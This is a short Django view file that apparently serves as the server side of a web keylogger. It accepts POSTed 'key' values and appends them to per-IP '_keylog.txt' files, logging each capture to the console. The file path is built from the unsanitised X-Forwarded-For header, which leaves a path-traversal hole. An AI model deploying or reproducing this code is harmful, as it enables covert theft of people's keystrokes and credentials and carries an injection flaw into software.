from django.shortcuts import render
from django.http import HttpResponse
from colorama import Fore,Style,init
import os

def index(request):
    if request.method == "POST":
        key = request.POST.get('key')
        try:
            x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
            if x_forwarded_for:
                ip = x_forwarded_for.split(',')[0]
            else:
                ip = request.META.get('REMOTE_ADDR')
        except:
            ip = None
        with open(os.path.dirname(__file__) + '/../../keylog/'+ ip+'_keylog.txt','a',encoding='utf-8') as f:
            f.truncate()
            f.write(key)
            f.close()
        print(Fore.GREEN + '[+]写入 -> ' + key + Style.RESET_ALL)
        return HttpResponse('')
    else:
        return render(request, 'index.html')